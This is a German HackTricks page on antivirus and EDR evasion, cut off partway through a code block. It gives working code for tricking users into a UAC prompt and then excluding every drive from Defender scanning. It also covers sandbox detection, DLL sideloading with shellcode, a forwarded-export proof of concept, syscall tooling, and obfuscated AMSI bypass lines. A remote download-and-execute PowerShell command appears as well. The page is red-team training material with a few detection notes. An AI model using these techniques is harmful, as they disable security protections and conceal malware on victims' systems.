# Antivirus (AV)-Bypass

{{#include ../banners/hacktricks-training.md}}

**Diese Seite wurde ursprünglich von** [**@m2rc_p**](https://twitter.com/m2rc_p)** geschrieben!**

## Defender stoppen

- [defendnot](https://github.com/es3n1n/defendnot): Ein Tool, um Windows Defender am Arbeiten zu hindern.
- [no-defender](https://github.com/es3n1n/no-defender): Ein Tool, das Windows Defender stoppt, indem es einen anderen AV vortäuscht.
- [Defender deaktivieren, wenn du Admin bist](basic-powershell-for-pentesters/README.md)

### UAC-Köder im Installer-Stil vor dem Manipulieren von Defender

Öffentliche Loader, die sich als Game-Cheats ausgeben, werden häufig als unsignierte Node.js/Nexe-Installer ausgeliefert, die den Nutzer zuerst **um erhöhte Berechtigungen bitten** und erst dann Defender unschädlich machen. Der Ablauf ist einfach:

1. Mit `net session` prüfen, ob administrative Rechte vorhanden sind. Der Befehl ist nur erfolgreich, wenn der aufrufende Prozess Admin-Rechte besitzt. Ein Fehlschlag bedeutet daher, dass der Loader als Standardbenutzer ausgeführt wird.
2. Sich sofort mit dem Verb `RunAs` neu starten, um die erwartete UAC-Zustimmungsaufforderung auszulösen und dabei die ursprüngliche Befehlszeile beizubehalten.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Opfer glauben bereits, dass sie „gecrackte“ Software installieren, und akzeptieren die Aufforderung daher meist. So erhält die Malware die nötigen Rechte, um die Richtlinien von Defender zu ändern.<sup>[[26]](#references)</sup>

### Pauschale `MpPreference`-Ausnahmen für jeden Laufwerksbuchstaben

Nach der Rechteausweitung maximieren GachiLoader-artige Ketten die blinden Flecken von Defender, statt den Dienst vollständig zu deaktivieren. Zuerst beendet der Loader den GUI-Watchdog (`taskkill /F /IM SecHealthUI.exe`) und fügt dann **extrem weitreichende Ausnahmen** hinzu, sodass jedes Benutzerprofil, jedes Systemverzeichnis und jedes Wechsellaufwerk nicht mehr gescannt werden kann:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Wichtige Beobachtungen:

- Die Schleife durchläuft jedes eingebundene Dateisystem (D:\, E:\, USB-Sticks usw.), sodass **alle künftig irgendwo auf der Festplatte abgelegten Payloads ignoriert werden**.
- Der Ausschluss der Erweiterung `.sys` ist zukunftsorientiert – Angreifer behalten sich damit die Möglichkeit vor, später unsignierte Treiber zu laden, ohne Defender erneut anzurühren.
- Alle Änderungen erfolgen unter `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`. So können spätere Phasen bestätigen, dass die Ausschlüsse bestehen bleiben, oder sie erweitern, ohne erneut UAC auszulösen.

Da kein Defender-Dienst angehalten wird, melden naive Integritätsprüfungen weiterhin „Antivirus aktiv“, obwohl die Echtzeitprüfung diese Pfade nicht mehr überwacht.<sup>[[26]](#references)</sup>

## **AV-Evasion-Methodik**

Derzeit verwenden AVs unterschiedliche Methoden, um zu prüfen, ob eine Datei bösartig ist: statische Erkennung, dynamische Analyse und bei fortgeschritteneren EDRs Verhaltensanalyse.

### **Statische Erkennung**

Bei der statischen Erkennung werden bekannte schädliche Zeichenfolgen oder Bytefolgen in einer Binärdatei oder einem Skript erkannt. Außerdem werden Informationen aus der Datei selbst extrahiert (z. B. Dateibeschreibung, Firmenname, digitale Signaturen, Symbol, Prüfsumme usw.). Das bedeutet, dass die Verwendung bekannter öffentlicher Tools dazu führen kann, dass du leichter entdeckt wirst, da diese wahrscheinlich bereits analysiert und als bösartig markiert wurden. Es gibt mehrere Möglichkeiten, diese Art der Erkennung zu umgehen:

- **Verschlüsselung**

Wenn du die Binärdatei verschlüsselst, kann AV dein Programm nicht erkennen. Du benötigst jedoch eine Art Loader, der das Programm entschlüsselt und im Arbeitsspeicher ausführt.

- **Obfuskation**

Manchmal musst du nur einige Zeichenfolgen in deiner Binärdatei oder deinem Skript ändern, damit es AV passiert. Je nachdem, was du obfuskieren möchtest, kann das jedoch zeitaufwendig sein.

- **Benutzerdefinierte Tools**

Wenn du eigene Tools entwickelst, gibt es keine bekannten schädlichen Signaturen. Das erfordert jedoch viel Zeit und Aufwand.

> [!TIP]
> Eine gute Möglichkeit, die statische Erkennung durch Windows Defender zu überprüfen, ist [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Das Tool teilt die Datei in mehrere Segmente auf und lässt Defender jedes einzeln scannen. So kann es dir genau mitteilen, welche Zeichenfolgen oder Bytes in deiner Binärdatei markiert wurden.

Ich empfehle dir dringend, dir diese [YouTube-Playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) über praktische AV Evasion anzusehen.

### Offline-Tests von PE-Merkmalen für statische Klassifikatoren

Gepackte oder verschlüsselte Payload-Bytes sind nur eine Eingabe für einen statischen Klassifikator. EMBER2024 extrahiert PE-Merkmale, darunter Imports, Exports, Sections, Header und Authenticode-Daten.<sup>[[48]](#references)</sup> In einem Loader-Experiment verringerte das Hinzufügen von 141 harmlos wirkenden Imports den Wert für Bösartigkeit von EMBER2024 um 93 %, während mit Malware assoziierte Imports ihn erhöhten. Dieses Ergebnis gilt für dieses Modell und diese Samples und ist keine zuverlässige Umgehung eines bestimmten AV-/EDR-Produkts.<sup>[[50]](#references)</sup>

Für einen autorisierten Loader-Test solltest du die Payload und den Ausführungspfad konstant halten, pro Variante jeweils eine beabsichtigte Build-Variable ändern und die Werte offline vergleichen. Prüfe die resultierenden PE-Merkmale, da sich eine Build-Änderung auf mehr als eine Merkmalsgruppe auswirken kann.<sup>[[49]](#references)[[50]](#references)</sup> Damit beabsichtigte Imports in der IAT verbleiben, rufe die ausgewählten Win32-APIs aus erreichbarem Code auf. Variiere die Auswahl und verteile die Aufrufstellen auf verschiedene Builds, statt eine feste Tarnfunktion zu erstellen, die als Signatur erkannt werden kann. Im Experiment wurden auch niedrigere Werte mit gültiger Codesignierung, Export-Einträgen und mehr Funktionen berichtet, die `.pdata` vergrößern; ungültige Signaturen hatten kaum Auswirkungen und der Effekt von `.pdata` war gering.<sup>[[50]](#references)</sup>

Das Paket `thrember` stellt Funktionen zur Merkmalextraktion und Benchmark-Modelle bereit. Installiere es und verwende anschließend `thrember.download_models("models")` mit einem bereits vorhandenen Verzeichnis `models`. Führe den Scorer danach aus dessen übergeordnetem Verzeichnis aus: Der Download-Helfer ändert das aktuelle Arbeitsverzeichnis. Der PE-Klassifikator kann ein Verzeichnis mit Builds bewerten, ohne diese an einen Scandienst zu übermitteln:<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

Halte die Versionen des Modells und des Feature-Extractors während des Vergleichs konstant. Ein niedrigerer Offline-Score zeigt nur, wie dieser Klassifikator auf die geänderte Binärdatei reagiert; er beweist nicht, dass Verhaltensanalyse, Emulation oder das abweichende Modell eines Anbieters umgangen werden.<sup>[[49]](#references)[[50]](#references)</sup> Informationen zu [Polymorphismus pro Build und Tarnung der äußeren Binärdatei in virtualisierten Payloads](virtualized-payload-execution.md#camouflaging-the-outer-go-executable) findest du im separaten Ausführungsmodell.

### **Dynamische Analyse**

Bei der dynamischen Analyse führt das AV deine Binärdatei in einer Sandbox aus und beobachtet sie auf bösartige Aktivitäten (z. B. den Versuch, die Passwörter deines Browsers zu entschlüsseln und auszulesen, einen Minidump von LSASS zu erstellen usw.). Das kann etwas schwieriger sein, aber hier sind einige Dinge, mit denen du Sandboxes umgehen kannst.

- **Sleep vor der Ausführung** Je nach Implementierung kann dies eine hervorragende Möglichkeit sein, die dynamische Analyse des AV zu umgehen. AVs haben nur sehr wenig Zeit, Dateien zu scannen, ohne den Arbeitsablauf des Benutzers zu unterbrechen. Lange Sleeps können daher die Analyse von Binärdateien stören. Das Problem ist, dass viele AV-Sandboxes den Sleep je nach Implementierung einfach überspringen können.
- **Systemressourcen überprüfen** Sandboxes verfügen normalerweise nur über sehr wenige Ressourcen (z. B. < 2 GB RAM), da sie sonst den Rechner des Benutzers verlangsamen könnten. Du kannst auch sehr kreativ werden, zum Beispiel die CPU-Temperatur oder sogar die Lüftergeschwindigkeit überprüfen – nicht alles davon wird in der Sandbox implementiert sein.
- **Maschinenspezifische Prüfungen** Wenn du einen Benutzer angreifen möchtest, dessen Arbeitsstation Mitglied der Domäne "contoso.local" ist, kannst du die Domäne des Computers überprüfen und feststellen, ob sie der von dir angegebenen entspricht. Ist das nicht der Fall, kannst du dein Programm beenden lassen.

Wie sich herausstellt, lautet der Computername der Microsoft Defender Sandbox HAL9TH. Du kannst also vor der Detonation in deiner Malware den Computernamen überprüfen. Lautet er HAL9TH, befindest du dich in der Defender-Sandbox, und dein Programm kann sich beenden.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>Quelle: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Weitere wirklich gute Tipps von [@mgeeky](https://twitter.com/mariuszbit) zum Umgehen von Sandboxes:

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev-Kanal</p></figcaption></figure>

Wie wir bereits in diesem Beitrag gesagt haben, werden **öffentliche Tools** früher oder später **erkannt**. Du solltest dir also eine Frage stellen:

Wenn du beispielsweise LSASS dumpen möchtest, **musst du wirklich mimikatz verwenden**? Oder könntest du ein anderes, weniger bekanntes Projekt verwenden, das ebenfalls LSASS dumpen kann?

Wahrscheinlich ist Letzteres die richtige Antwort. Nimmt man mimikatz als Beispiel: Es ist wahrscheinlich eines der – wenn nicht sogar das am häufigsten von AVs und EDRs markierten Malware-Tools. Das Projekt selbst ist zwar großartig, aber es ist auch ein Albtraum, damit AVs zu umgehen. Suche also einfach nach Alternativen für das, was du erreichen möchtest.

> [!TIP]
> Wenn du deine Payloads zur Umgehung von Erkennung anpasst, solltest du **die automatische Übermittlung von Samples** in Defender deaktivieren. Und bitte, ganz im Ernst: **Lade nichts auf VIRUSTOTAL hoch**, wenn du langfristig eine Umgehung der Erkennung erreichen möchtest. Wenn du überprüfen willst, ob ein bestimmtes AV deine Payload erkennt, installiere es auf einer VM, versuche die automatische Übermittlung von Samples zu deaktivieren und teste es dort, bis du mit dem Ergebnis zufrieden bist.

## EXEs vs DLLs

Wenn immer möglich, solltest du für die Umgehung von Erkennung **DLLs bevorzugen**. Meiner Erfahrung nach werden DLL-Dateien normalerweise **deutlich seltener erkannt** und analysiert. In manchen Fällen ist das also ein sehr einfacher Trick, um eine Erkennung zu vermeiden (vorausgesetzt, deine Payload kann als DLL ausgeführt werden).

Wie wir in diesem Bild sehen, hat eine DLL-Payload von Havoc auf antiscan.me eine Erkennungsrate von 4/26, während die EXE-Payload eine Erkennungsrate von 7/26 aufweist.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>Vergleich auf antiscan.me: eine normale Havoc-EXE-Payload gegenüber einer normalen Havoc-DLL</p></figcaption></figure>

Nun zeigen wir einige Tricks, mit denen du DLL-Dateien noch heimlicher einsetzen kannst.

## DLL Sideloading & Proxying

**DLL Sideloading** nutzt die vom Loader verwendete DLL-Suchreihenfolge aus, indem sowohl die Opferanwendung als auch die bösartige(n) Payload(s) nebeneinander platziert werden.

Mit [Siofra](https://github.com/Cybereason/siofra) und dem folgenden PowerShell-Skript kannst du nach Programmen suchen, die für DLL Sideloading anfällig sind:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Dieser Befehl gibt eine Liste der Programme in "C:\Program Files\\" aus, die anfällig für DLL Hijacking sind, sowie der DLL-Dateien, die sie zu laden versuchen.

Ich empfehle dringend, **DLL Hijackable/Sideloadable programs selbst zu erkunden**. Diese Technik ist bei korrekter Anwendung ziemlich stealthy. Wenn du jedoch öffentlich bekannte DLL Sideloadable programs verwendest, kannst du leicht entdeckt werden.

Wenn du einfach eine bösartige DLL mit dem Namen platzierst, den ein Programm zu laden erwartet, wird dein payload nicht geladen, da das Programm bestimmte Funktionen in dieser DLL erwartet. Um dieses Problem zu beheben, verwenden wir eine weitere Technik namens **DLL Proxying/Forwarding**.

**DLL Proxying** leitet die Aufrufe, die ein Programm macht, von der Proxy-DLL (der bösartigen DLL) an die originale DLL weiter. Dadurch bleibt die Funktionalität des Programms erhalten, und dein payload kann ausgeführt werden.

Ich werde das Projekt [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) von [@flangvik](https://twitter.com/Flangvik/) verwenden.

Dies sind die Schritte, die ich befolgt habe:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Der letzte Befehl liefert uns 2 Dateien: eine DLL-Quellcodevorlage und die ursprüngliche umbenannte DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Das sind die Ergebnisse:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sowohl unser Shellcode (mit [SGN](https://github.com/EgeBalci/sgn) codiert) als auch die Proxy-DLL haben auf [antiscan.me](https://antiscan.me) eine Erkennungsrate von 0/26! Ich würde das als Erfolg bezeichnen.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ich **empfehle dringend**, dir [S3cur3Th1sSh1ts Twitch-VOD](https://www.twitch.tv/videos/1644171543) über DLL Sideloading sowie [ippsecs Video](https://www.youtube.com/watch?v=3eROsG_WNpE) anzusehen, um mehr über das zu erfahren, was wir besprochen haben.

### Abusing Forwarded Exports (ForwardSideLoading)

Windows-PE-Module können Funktionen exportieren, die tatsächlich „Forwarder“ sind: Statt auf Code zu verweisen, enthält der Exporteintrag eine ASCII-Zeichenfolge im Format `TargetDll.TargetFunc`. Wenn ein Aufrufer den Export auflöst, führt der Windows-Loader Folgendes aus:

- `TargetDll` laden, falls sie noch nicht geladen ist
- `TargetFunc` daraus auflösen

Wichtige Verhaltensweisen, die du kennen solltest:
- Wenn `TargetDll` eine KnownDLL ist, wird sie aus dem geschützten KnownDLLs-Namespace bereitgestellt (z. B. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Wenn `TargetDll` keine KnownDLL ist, wird die normale DLL-Suchreihenfolge verwendet, zu der auch das Verzeichnis des Moduls gehört, das die Weiterleitung auflöst.

Das ermöglicht eine indirekte Sideloading-Methode: Finde eine signierte DLL, die eine Funktion exportiert, die an einen Nicht-KnownDLL-Modulnamen weitergeleitet wird, und platziere diese signierte DLL zusammen mit einer vom Angreifer kontrollierten DLL, die exakt wie das weitergeleitete Zielmodul heißt. Wenn der weitergeleitete Export aufgerufen wird, löst der Loader die Weiterleitung auf und lädt deine DLL aus demselben Verzeichnis, wodurch dein DllMain ausgeführt wird.<sup>[[13]](#references)</sup>

Beispiel unter Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` ist keine KnownDLL, daher wird sie über die normale Suchreihenfolge aufgelöst.

PoC (kopieren und einfügen):
1) Kopiere die signierte System-DLL in einen beschreibbaren Ordner
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Lege eine bösartige `NCRYPTPROV.dll` im selben Ordner ab. Ein minimales DllMain reicht aus, um Code auszuführen; du musst die weitergeleitete Funktion nicht implementieren, damit DllMain ausgelöst wird.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Löse die Weiterleitung mit einem signierten LOLBin aus:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Beobachtetes Verhalten:
- rundll32 (signiert) lädt die Side-by-Side-`keyiso.dll` (signiert)
- Beim Auflösen von `KeyIsoSetAuditingInterface` folgt der Loader dem Forward auf `NCRYPTPROV.SetAuditingInterface`
- Der Loader lädt dann `NCRYPTPROV.dll` aus `C:\test` und führt dessen `DllMain` aus
- Wenn `SetAuditingInterface` nicht implementiert ist, erscheint der Fehler „missing API“ erst, nachdem `DllMain` bereits ausgeführt wurde

Tipps für die Suche:
- Konzentriere dich auf weitergeleitete Exporte, deren Zielmodul keine KnownDLL ist. KnownDLLs sind unter `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` aufgeführt.
- Du kannst weitergeleitete Exporte mit Tools wie diesen auflisten:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Siehe das Windows 11-Forwarder-Inventar, um nach Kandidaten zu suchen: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ideen zur Erkennung/Abwehr:
- LOLBins (z. B. rundll32.exe) überwachen, die signierte DLLs aus Nicht-Systempfaden laden und anschließend Nicht-KnownDLLs mit demselben Basisnamen aus diesem Verzeichnis laden
- Bei Prozess-/Modulketten wie `rundll32.exe` → `keyiso.dll` außerhalb des Systems → `NCRYPTPROV.dll` in benutzerschreibbaren Pfaden alarmieren
- Codeintegritätsrichtlinien (WDAC/AppLocker) durchsetzen und Schreib- und Ausführungsrechte in Anwendungsverzeichnissen verweigern

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Mit Freeze kannst du deinen Shellcode unauffällig laden und ausführen.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion ist ein Katz-und-Maus-Spiel: Was heute funktioniert, kann morgen erkannt werden. Verlasse dich daher nie nur auf ein Tool und versuche, wenn möglich, mehrere Evasion-Techniken zu kombinieren.

## Direkte/indirekte Syscalls & SSN-Auflösung (SysWhispers4)

EDRs platzieren häufig **Inline-Hooks im User-Mode** auf den Syscall-Stubs von `ntdll.dll`. Um diese Hooks zu umgehen, kannst du **direkte** oder **indirekte** Syscall-Stubs generieren, die die korrekte **SSN** (System Service Number) laden und in den Kernel-Modus wechseln, ohne den gehookten Export-Einstiegspunkt auszuführen.<sup>[[32]](#references)</sup>

**Aufrufoptionen:**
- **Direkt (eingebettet)**: Gibt eine `syscall`-/`sysenter`-/`SVC #0`-Instruktion im generierten Stub aus (kein Aufruf eines `ntdll`-Exports).
- **Indirekt**: Springt in ein vorhandenes `syscall`-Gadget innerhalb von `ntdll`, sodass der Kernel-Übergang scheinbar von `ntdll` ausgeht (nützlich zur Umgehung heuristischer Erkennung); **randomized indirect** wählt pro Aufruf ein Gadget aus einem Pool.
- **Egg-hunt**: Vermeidet es, die statische Opcode-Sequenz `0F 05` auf der Festplatte einzubetten; löst eine Syscall-Sequenz zur Laufzeit auf.

**Hook-resistente Strategien zur SSN-Auflösung:**
- **FreshyCalls (VA sort)**: Leitet SSNs ab, indem Syscall-Stubs nach virtueller Adresse sortiert werden, statt die Stub-Bytes auszulesen.
- **SyscallsFromDisk**: Mappt eine unveränderte `\KnownDlls\ntdll.dll`, liest SSNs aus deren `.text` und hebt anschließend das Mapping auf (umgeht alle Hooks im Speicher).
- **RecycledGate**: Kombiniert die SSN-Ableitung anhand der VA-Sortierung mit einer Opcode-Validierung, wenn ein Stub sauber ist; fällt bei gehookten Stubs auf die VA-Ableitung zurück.
- **HW Breakpoint**: Setzt DR0 auf die `syscall`-Instruktion und verwendet einen VEH, um die SSN zur Laufzeit aus `EAX` auszulesen, ohne gehookte Bytes zu analysieren.

Beispiel für die Verwendung von SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI wurde entwickelt, um „[dateilose Malware](https://en.wikipedia.org/wiki/Fileless_malware)“ zu verhindern. Anfangs konnten AVs nur **Dateien auf dem Datenträger** scannen. Wenn es dir also gelang, Payloads **direkt im Arbeitsspeicher** auszuführen, konnte der AV nichts dagegen tun, da ihm die nötige Sichtbarkeit fehlte.

Die AMSI-Funktion ist in diese Windows-Komponenten integriert:

- Benutzerkontensteuerung (User Account Control, UAC; Elevation von EXE, COM, MSI oder ActiveX-Installation)
- PowerShell (Skripte, interaktive Verwendung und dynamische Codeauswertung)
- Windows Script Host (wscript.exe und cscript.exe)
- JavaScript und VBScript
- Office-VBA-Makros

Sie ermöglicht Antivirus-Lösungen, das Verhalten von Skripten zu untersuchen, indem Skriptinhalte unverschlüsselt und unverschleiert bereitgestellt werden.

Die Ausführung von `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` löst in Windows Defender die folgende Warnung aus.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Beachte, dass `amsi:` vorangestellt wird, gefolgt vom Pfad der ausführbaren Datei, über die das Skript ausgeführt wurde – in diesem Fall powershell.exe.

Wir haben keine Datei auf den Datenträger geschrieben, wurden aber trotzdem im Arbeitsspeicher durch AMSI erkannt.

Außerdem wird C#-Code ab **.NET 4.8** ebenfalls durch AMSI geprüft. Das betrifft sogar `Assembly.Load(byte[])`, mit dem Code zur Ausführung im Arbeitsspeicher geladen wird. Deshalb wird für die Ausführung im Arbeitsspeicher die Verwendung älterer .NET-Versionen (wie 4.7.2 oder niedriger) empfohlen, wenn du AMSI umgehen möchtest.

Es gibt mehrere Möglichkeiten, AMSI zu umgehen:

- **Obfuskation**

Da AMSI hauptsächlich mit statischen Erkennungen arbeitet, kann die Änderung der zu ladenden Skripte eine gute Möglichkeit sein, der Erkennung zu entgehen.

AMSI kann jedoch Skripte auch dann entobfuskieren, wenn sie mehrere Ebenen enthalten. Je nach Vorgehensweise kann Obfuskation daher eine schlechte Option sein. Dadurch ist die Umgehung nicht ganz einfach. Manchmal reicht es allerdings, ein paar Variablennamen zu ändern. Es hängt also davon ab, wie stark etwas markiert wurde.

- **AMSI Bypass**

Da AMSI implementiert wird, indem eine DLL in den PowerShell-Prozess (ebenso in cscript.exe, wscript.exe usw.) geladen wird, lässt sich diese leicht manipulieren – sogar als unprivilegierter Benutzer. Aufgrund dieses Implementierungsfehlers von AMSI haben Forscher mehrere Möglichkeiten gefunden, dem AMSI-Scan zu entgehen.

**Forcing an Error**

Wenn die AMSI-Initialisierung fehlschlägt (amsiInitFailed), wird für den aktuellen Prozess kein Scan gestartet. Ursprünglich wurde dies von [Matt Graeber](https://twitter.com/mattifestation) offengelegt. Microsoft hat eine Signatur entwickelt, um eine breitere Nutzung zu verhindern.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Es genügte eine einzige Zeile PowerShell-Code, um AMSI für den aktuellen PowerShell-Prozess unbrauchbar zu machen. Diese Zeile wurde natürlich von AMSI selbst erkannt, daher ist eine Änderung nötig, um diese Technik anzuwenden.

Hier ist ein modifizierter AMSI bypass, den ich diesem [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) entnommen habe.

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Beachte, dass dieser Beitrag wahrscheinlich markiert wird, sobald er veröffentlicht ist. Du solltest also keinen Code veröffentlichen, wenn du vorhast, unentdeckt zu bleiben.

**Memory Patching**

Diese Technik wurde ursprünglich von [@RastaMouse](https://twitter.com/_RastaMouse/) entdeckt. Dabei wird die Adresse der Funktion „AmsiScanBuffer“ in amsi.dll gesucht, die für das Scannen der vom Benutzer bereitgestellten Eingabe zuständig ist, und mit Anweisungen überschrieben, die den Code für E_INVALIDARG zurückgeben. Auf diese Weise gibt das Ergebnis des eigentlichen Scans 0 zurück, was als sauberes Ergebnis interpretiert wird.

> [!TIP]
> Lies [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) für eine ausführlichere Erklärung.

Es gibt auch viele weitere Techniken, um AMSI mit powershell zu umgehen. Weitere Informationen findest du auf [**dieser Seite**](basic-powershell-for-pentesters/index.html#amsi-bypass) und in [**diesem Repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell).

### AMSI-COM-Scan-Pointer-Umleitung statt `AmsiScanBuffer`-Patching

Ein weiterer prozesslokaler Bypass lässt den Einstiegspunkt `AmsiScanBuffer` unangetastet. Im beschriebenen 64-Bit-.NET-Loader wird ein AMSI-COM-Objekt mit der CLSID `fdb00e52-a214-4aa1-8fba-4357bb0072ec` erstellt; `Marshal.GetIUnknownForObject()` liefert den Interface-Pointer, und sein vtable-Slot am Offset `0x18` wird als Ziel des Scan-Aufrufs verwendet. Der Loader patcht einen nativen Pointer für `Console.Clear()` mit einem kurzen x64-Stub, ändert diesen vtable-Eintrag mithilfe von `VirtualProtect()` auf den Stub und stellt anschließend den ursprünglichen Seitenschutz wieder her. Sowohl die 64-Bit-Pointerbreite als auch das erwartete COM-Layout sind Voraussetzungen; dies ist kein universeller Offset für beliebige AMSI-Interfaces oder Builds. Die zuvor beobachteten Schritte sind das [Laden eines signierten AppDomainManager-Sidecars](windows-local-privilege-escalation/dll-hijacking/#signed-appdomainmanager-type-as-a-configuration-file-gadget) und die [RESX-Deserialisierung](../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml).<sup>[[51]](#references)</sup>

Die beobachteten Stub-Bytes sind `41 C7 00 01 00 00 00 33 C0 C3`: Sie schreiben **1** in den Ergebnis-Pointer in `r8` und geben **0** in `eax` zurück. Daher vermischt die beschriebene Behauptung, das Scan-Ergebnis sei `AMSI_RESULT_CLEAN` (0), den Rückgabewert `S_OK` mit dem Ausgabe-Enum. In der dokumentierten Reihenfolge von `AMSI_RESULT` ist Ergebnis **1** `AMSI_RESULT_NOT_DETECTED`; es liegt weiterhin unterhalb des Erkennungsschwellenwerts.<sup>[[51]](#references)[[52]](#references)[[53]](#references)</sup>

### AMSI blockieren, indem das Laden von amsi.dll verhindert wird (LdrLoadDll-Hook)

AMSI wird erst initialisiert, nachdem `amsi.dll` in den aktuellen Prozess geladen wurde. Ein robuster, sprachunabhängiger Bypass besteht darin, einen User-Mode-Hook auf `ntdll!LdrLoadDll` zu setzen, der einen Fehler zurückgibt, wenn das angeforderte Modul `amsi.dll` ist. Dadurch wird AMSI nie geladen und der Prozess führt keine Scans aus.<sup>[[23]](#references)</sup>

Implementierungsübersicht (x64-C/C++-Pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
